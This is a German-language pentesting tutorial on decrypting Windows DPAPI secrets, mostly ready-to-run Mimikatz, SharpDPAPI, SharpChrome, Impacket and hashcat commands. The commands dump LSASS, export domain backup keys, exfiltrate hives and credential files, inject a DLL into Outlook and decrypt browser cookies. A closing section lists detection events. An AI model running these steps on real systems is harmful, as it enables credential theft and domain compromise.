# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich innerhalb des Windows-Betriebssystems für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet und nutzt dabei entweder Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, da sie Daten mithilfe eines Schlüssels verschlüsseln können, der aus den Anmeldegeheimnissen des Benutzers oder – bei der Systemverschlüsselung – aus den Domänenauthentifizierungsgeheimnissen des Systems abgeleitet wird. Dadurch müssen Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten.

Die häufigste Möglichkeit zur Verwendung von DPAPI besteht über die Funktionen **`CryptProtectData` und `CryptUnprotectData`**, mit denen Anwendungen Daten unter Verwendung des Sicherheitskontexts des aktuell angemeldeten Prozesses verschlüsseln und entschlüsseln können. Standardmäßig können die Daten nur von demselben Benutzer- oder Systemkontext entschlüsselt werden, der sie verschlüsselt hat.<sup>[[2]](#references)[[3]](#references)</sup>

Diese Funktionen akzeptieren außerdem einen optionalen **Entropieparameter**, der während der Verschlüsselung und Entschlüsselung verwendet wird. Mit optionaler Entropie geschützte Daten erfordern für die Entschlüsselung denselben Entropiewert.<sup>[[2]](#references)[[6]](#references)</sup>

### Generierung des Benutzerschlüssels

DPAPI leitet einen benutzerspezifischen Wert (oft **pre-key** genannt) aus den Anmeldedaten des Benutzers ab. Die genaue Ableitung hängt vom Konto und der Betriebssystemversion ab. Beispielsweise versucht Impacket einen HMAC-SHA1-Pfad basierend auf dem SHA-1-Digest des UTF-16LE-Passworts, einen weiteren basierend auf dem MD4/NT-Hash des Passworts sowie einen von PBKDF2-SHA256 abgeleiteten Pfad für Protected Users. Deshalb können Offline-Tools das erforderliche Material häufig entweder aus dem Klartextpasswort oder aus einem verfügbaren NT-Hash ableiten.<sup>[[2]](#references)[[10]](#references)</sup>

Dies ist besonders interessant, da ein Angreifer, der den Passwort-Hash des Benutzers erlangt, Folgendes tun kann:

- **Beliebige mit DPAPI verschlüsselte Daten entschlüsseln**, die mit dem Schlüssel dieses Benutzers verschlüsselt wurden, ohne eine API kontaktieren zu müssen
- Versuchen, das **Passwort offline zu cracken**, indem versucht wird, den gültigen DPAPI-Schlüssel zu generieren

DPAPI verwaltet für jeden Benutzer einen oder mehrere **Master keys**, anstatt für jeden geschützten Blob einen neuen Master key zu erstellen. Jeder Master key besitzt eine **GUID** (Globally Unique Identifier), und ein verschlüsselter Blob enthält Informationen darüber, welcher Master key ihn schützt.<sup>[[2]](#references)</sup>

Master keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier des Benutzers ist. Die Master-Key-Datei enthält Material, das durch den **pre-key** des Benutzers geschützt ist, sowie bei Domänenbenutzern Wiederherstellungsmaterial, das durch einen **domain backup key** geschützt ist.<sup>[[2]](#references)</sup>

Beachte, dass der **domain key, der zur Verschlüsselung des Master keys verwendet wird, sich auf den Domain Controllern befindet und sich niemals ändert**. Wenn ein Angreifer Zugriff auf den Domain Controller hat, kann er daher den domain backup key abrufen und die Master keys aller Benutzer in der Domäne entschlüsseln.<sup>[[2]](#references)</sup>

Die verschlüsselten Blobs enthalten in ihren Headern die **GUID des Master keys**, der zur Verschlüsselung der darin enthaltenen Daten verwendet wurde.

> [!TIP]
> DPAPI-verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master keys finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
So sehen mehrere Master Keys eines Benutzers aus:

![Was ist DPAPI - Generierung der User-Keys: So sehen mehrere Master Keys eines Benutzers aus](<../../images/image (1121).png>)

### Generierung von Machine/System-Keys

Dieser Key wird von der Maschine zur Verschlüsselung von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Key, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Key wird zur Verschlüsselung von Daten verwendet, die für das System selbst zugänglich sein müssen, beispielsweise Machine-Level-Credentials oder systemweite Secrets.<sup>[[2]](#references)</sup>

Beachte, dass diese Keys **kein Domain-Backup haben** und daher nur lokal zugänglich sind:

- **Mimikatz** kann darauf zugreifen, indem es LSA secrets mit folgendem Befehl ausliest: `mimikatz lsadump::secrets`
- Das Secret wird in der Registry gespeichert, daher könnte ein Administrator die **DACL-Berechtigungen ändern, um darauf zuzugreifen**. Der Registry-Pfad lautet: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Eine Offline-Extraktion aus Registry-Hives ist ebenfalls möglich. Beispielsweise können die Hives als Administrator auf dem Zielsystem gespeichert und exfiltriert werden:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Dann stellst du auf deiner Analysis-Box das DPAPI_SYSTEM-LSA secret aus den Hives wieder her und verwendest es, um Machine-Scope-Blobs zu entschlüsseln (Passwörter geplanter Tasks, Service-Credentials, Wi-Fi-Profile usw.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Veeam-spezifisches DPAPI-Beispiel:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Durch DPAPI geschützte Daten

Zu den durch DPAPI geschützten persönlichen Daten gehören:

- Windows-Anmeldedaten
- Passwörter und AutoComplete-Daten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Kontopasswörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüsseln
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Von Credential Manager verwaltete Netzwerkpasswörter und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und weitere
- Verschlüsselte Blobs in der Registrierung
- ...

Zu den vom System geschützten Daten gehören:
- WLAN-Passwörter
- Passwörter geplanter Tasks
- ...

### Optionen zur Extraktion des Master Keys

- Wenn der Benutzer über Domain-Admin-Rechte verfügt, kann er auf den **domain backup key** zugreifen, um alle Master Keys der Benutzer in der Domain zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Administratorrechten ist es möglich, auf den **LSASS-Speicher zuzugreifen**, um die DPAPI-Masterkeys aller verbundenen Benutzer sowie den SYSTEM-Key zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer über lokale Administratorrechte verfügt, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die Master Keys des Computers zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kannst du die **Master Keys des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn du dich als der Benutzer in einer Session befindest, ist es möglich, den **backup key zum Entschlüsseln der Master Keys über RPC** beim DC anzufordern. Wenn du lokaler Administrator bist und der Benutzer angemeldet ist, könntest du dafür **sein Session-Token stehlen**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault auflisten
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Häufig geschützte Dateien von Benutzern befinden sich in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfe außerdem, ob `\Roaming\` in den obigen Pfaden durch `\Local\` ersetzt werden kann.

Beispiele für die Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um mithilfe von DPAPI vertrauliche Daten wie Cookies zu entschlüsseln.<sup>[[12]](#references)</sup>

#### Schnellanleitungen für Chromium/Edge/Electron (SharpChrome)

- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/Cookies (funktioniert auch mit app-bound cookies ab Chrome 127+, da der zusätzliche Schlüssel bei Ausführung im Benutzerkontext aus dem Credential Manager des Benutzers aufgelöst wird):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-Analyse, wenn Sie nur über Dateien verfügen. Extrahieren Sie zunächst den AES state key aus dem Profil-„Local State“ und verwenden Sie ihn anschließend, um die Cookie-Datenbank zu entschlüsseln:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-weite/Remote-Triage, wenn du den DPAPI domain backup key (PVK) und Admin-Rechte auf dem Zielhost hast:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Wenn du über den DPAPI prekey/credkey eines Benutzers (aus LSASS) verfügst, kannst du das password cracking überspringen und Profildaten direkt entschlüsseln:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Hinweise
- Neuere Chrome/Edge-Builds speichern bestimmte Cookies möglicherweise mit "App-Bound"-Verschlüsselung. Die Offline-Entschlüsselung dieser spezifischen Cookies ist ohne den zusätzlichen app-bound key nicht möglich; führe SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome security blog post.<sup>[[5]](#references)</sup>

### Zugriffsschlüssel und Daten

- **Use SharpDPAPI**, um Anmeldedaten aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung abzurufen:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Anmeldeinformationen abrufen**, z. B. die verschlüsselten Daten und den guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Auf Masterkeys zugreifen**:

Einen Masterkey eines Users entschlüsseln, der den **domain backup key** über RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente für die Masterkey-Entschlüsselung (beachte, dass `/rpc` verwendet werden kann, um den Domänen-Backupschlüssel abzurufen, `/password` verwendet werden kann, um ein Klartextpasswort zu nutzen, oder `/pvk`, um eine private DPAPI-Domänenschlüsseldatei anzugeben ...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem Masterkey entschlüsseln**
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das Tool **SharpDPAPI** unterstützt ebenfalls diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass `/rpc` verwendet werden kann, um den Domänen-Backup-Key abzurufen, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine DPAPI-Domänen-Private-Key-Datei anzugeben, und `/unprotect`, um die Session des aktuellen Benutzers zu verwenden...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Einen DPAPI-Prekey/Credkey direkt verwenden (kein Passwort erforderlich)

Wenn du LSASS dumpen kannst, zeigt Mimikatz häufig einen benutzerbezogenen DPAPI-Schlüssel pro Anmeldung an, der zum Entschlüsseln der Masterkeys des Benutzers verwendet werden kann, ohne das Klartextpasswort zu kennen. Übergib diesen Wert direkt an das Tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Einige Daten mit der **aktuellen Benutzersitzung** entschlüsseln:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline-Entschlüsselung mit Impacket dpapi.py

Wenn du die SID und das Passwort des Opferbenutzers (oder den NT-Hash) besitzt, kannst du DPAPI masterkeys und Credential Manager blobs vollständig offline mit Impackets dpapi.py entschlüsseln.<sup>[[10]](#references)[[11]](#references)</sup>

- Artefakte auf der Festplatte identifizieren:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Zugehöriger masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Wenn die Tools zur Dateiübertragung unzuverlässig sind, base64 die Dateien auf dem Host und kopiere die Ausgabe:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Den masterkey mit der SID und dem Passwort/Hash des Benutzers entschlüsseln:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Verwende den entschlüsselten masterkey, um den credential blob zu entschlüsseln:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Dieser Workflow stellt häufig Domain-Credentials wieder her, die von Anwendungen mit dem Windows Credential Manager gespeichert wurden, einschließlich administrativer Konten (z. B. `*_adm`).

---

### Umgang mit optionaler Entropy ("Third-party entropy")

Einige Anwendungen übergeben einen zusätzlichen **Entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte Masterkey bekannt ist. Das Erlangen der Entropy ist daher beim Angreifen von auf diese Weise geschützten Credentials unerlässlich (z. B. bei Microsoft Outlook und einigen VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine User-Mode-DLL, die die DPAPI-Funktionen innerhalb des Zielprozesses hookt und jede übergebene optionale Entropy transparent aufzeichnet. Wird EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` ausgeführt, wird eine Datei ausgegeben, die jeden Entropy-Buffer dem aufrufenden Prozess und Blob zuordnet. Die aufgezeichnete Entropy kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline-Cracking von masterkeys (Hashcat & DPAPISnoop)

Microsoft führte ab Windows 10 v1607 (2016) ein **context 3**-masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Cracking von Benutzerpasswörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher Wordlist- oder Brute-Force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann außerdem **Credential- und Vault-Blobs** parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartextpasswörter exportieren.<sup>[[8]](#references)</sup>


### Auf Daten anderer Computer zugreifen

In **SharpDPAPI und SharpChrome** kannst du die Option **`/server:HOST`** angeben, um auf die Daten eines entfernten Computers zuzugreifen. Natürlich musst du Zugriff auf diesen Computer haben. Im folgenden Beispiel wird vorausgesetzt, dass der **Domänen-Sicherungsschlüssel für die Verschlüsselung bekannt ist**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Andere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domain Controllers über RPC automatisiert. Das Script löst anschließend die IP-Adresse aller Computer auf und führt auf allen Computern einen smbclient aus, um alle DPAPI blobs aller Benutzer abzurufen und mit dem Domain backup key alles zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kannst du jedes Subnetzwerk finden, selbst wenn du es vorher nicht kanntest!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Secrets dumpen. Das 2.x-Release führte Folgendes ein:<sup>[[9]](#references)</sup>

* Parallele Sammlung von blobs von Hunderten Hosts
* Parsing von **context 3** masterkeys und automatische Integration des Hashcat cracking
* Unterstützung für verschlüsselte Chrome-„App-Bound“-Cookies (siehe nächsten Abschnitt)
* Einen neuen **`--snapshot`**-Modus, um Endpunkte wiederholt abzufragen und neu erstellte blobs zu vergleichen

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional automatisch cracking ausführen kann. Das Tool unterstützt vollständig machine- und user-masterkey-Formate bis einschließlich Windows 11 24H1.<sup>[[8]](#references)</sup>


## Häufige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Insbesondere über einen Network Share wie **C$** oder **ADMIN$**.
- Verwendung von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder masterkeys zu dumpen.
- Event **4662**: *Eine Operation wurde auf einem Objekt ausgeführt* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Event **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* anfordert (Credential Manager)

---
### Sicherheitslücken und Änderungen im Ökosystem 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugriff konnte ein Domain-Mitglied dazu bringen, einen schädlichen DPAPI backup key abzurufen, wodurch die Entschlüsselung von Benutzer-masterkeys ermöglicht wurde. Die Sicherheitslücke wurde mit dem kumulativen Update vom November 2023 behoben – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.<sup>[[4]](#references)</sup>
* **Chrome 127 „App-Bound“-Cookie-Verschlüsselung** (Juli 2024) ersetzte den bisherigen reinen DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert nun sowohl den DPAPI masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie mit dem Benutzerkontext ausgeführt werden.<sup>[[5]](#references)</sup>


### Fallstudie: Zscaler Client Connector – Benutzerdefinierte Entropie aus der SID abgeleitet

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei wird mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter verwendet eine **custom entropy**, die *zur Laufzeit berechnet* wird, anstatt auf der Festplatte gespeichert zu werden.<sup>[[1]](#references)</sup>

Die Entropie wird aus zwei Elementen rekonstruiert:

1. Ein fest codiertes Secret, das in `ZSACredentialProvider.dll` eingebettet ist.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, kann **jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID erneut generieren** und die Blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung liefert die vollständige JSON-Konfiguration einschließlich jeder **device posture check** und ihres erwarteten Werts – Informationen, die bei client-seitigen Bypasses äußerst wertvoll sind.

> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropy (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt wurden.

## References

- [1] [Synacktiv – Solltest du deinem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Sicherheitsanalyse und Datenwiederherstellung in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lesen von DPAPI-verschlüsselten Secrets mit Mimikatz und C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 – Windows DPAPI (Data Protection Application Programming Interface) Spoofing-Schwachstelle](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Verbesserung der Sicherheit von Chrome-Cookies unter Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Einfache Extraktion optionaler DPAPI-Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 – Versionshinweise](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub-Repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI-Projektseite](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD-ACL-Missbrauch, KeePassXC-Argon2-Cracking und DPAPI-Entschlüsselung bis zum DC-Administrator](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Verwendung und Optionen](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
